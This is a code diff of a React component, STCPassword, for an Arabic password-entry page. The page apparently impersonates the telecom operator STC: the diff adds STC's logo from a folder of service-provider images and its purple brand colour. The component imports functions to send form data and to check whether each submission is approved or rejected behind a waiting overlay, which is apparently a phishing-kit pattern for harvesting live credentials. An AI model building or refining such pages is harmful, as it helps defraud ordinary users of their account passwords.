@@ -7,14 +7,13 @@ import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
 import {
   sendData,
   isFormApproved,
   isFormRejected,
   navigateToPage,
 } from "@/lib/store";
-import { Eye, EyeOff, Lock } from "lucide-react";
+import { Lock } from "lucide-react";
 
 const schema = z.object({
   password: z.string()
@@ -77,7 +76,16 @@ export default function STCPassword() {
     <PageLayout variant="default" className="bg-white min-h-screen">
       <WaitingOverlay />
 
-      <div className="px-6 py-8">
+      <div className="px-6 py-8 flex flex-col min-h-screen">
+        {/* STC Logo */}
+        <div className="flex justify-center mb-6">
+          <img 
+            src="/images/service-providers/stc.png" 
+            alt="STC" 
+            className="h-16 w-auto"
+          />
+        </div>
+
         {/* Header */}
         <div className="text-center mb-8">
           <h1 className="text-xl font-bold text-gray-800 mb-2">أدخل كلمة المرور</h1>
@@ -86,28 +94,30 @@ export default function STCPassword() {
           </p>
         </div>
 
-        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
+        <form onSubmit={handleSubmit(onSubmit)} className="flex-1 flex flex-col">
           {/* Password Field */}
           <div className="space-y-2">
             <div className="flex items-center justify-between">
+              <div className="flex items-center gap-2">
+                <Lock className="w-4 h-4 text-gray-400" />
+                <span className="text-gray-700 text-sm">كلمة المرور</span>
+              </div>
               <button
                 type="button"
                 onClick={() => setShowPassword(!showPassword)}
-                className="text-primary text-sm"
+                className="text-sm font-medium"
+                style={{ color: '#4F008C' }}
               >
                 {showPassword ? "إخفاء" : "اظهار"}
               </button>
-              <div className="flex items-center gap-2">
-                <Label htmlFor="password" className="text-gray-700">كلمة المرور</Label>
-                <Lock className="w-4 h-4 text-gray-400" />
-              </div>
             </div>
             <div className="relative">
               <Input
                 id="password"
                 type={showPassword ? "text" : "password"}
                 placeholder=""
-                className="text-right pr-4"
+                className="text-left pl-4 h-12 border-gray-300"
+                dir="ltr"
                 {...register("password")}
               />
             </div>
@@ -119,12 +129,15 @@ export default function STCPassword() {
             )}
           </div>
 
+          {/* Spacer */}
+          <div className="flex-1"></div>
+
           {/* Submit Button */}
-          <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t">
+          <div className="pb-8 pt-4">
             <Button 
               type="submit" 
-              className="w-full bg-gray-300 hover:bg-primary text-gray-600 hover:text-white" 
-              size="lg"
+              className="w-full h-14 text-base font-medium rounded-lg"
+              style={{ backgroundColor: '#E5E5E5', color: '#666666' }}
             >
               تسجيل الدخول
             </Button>
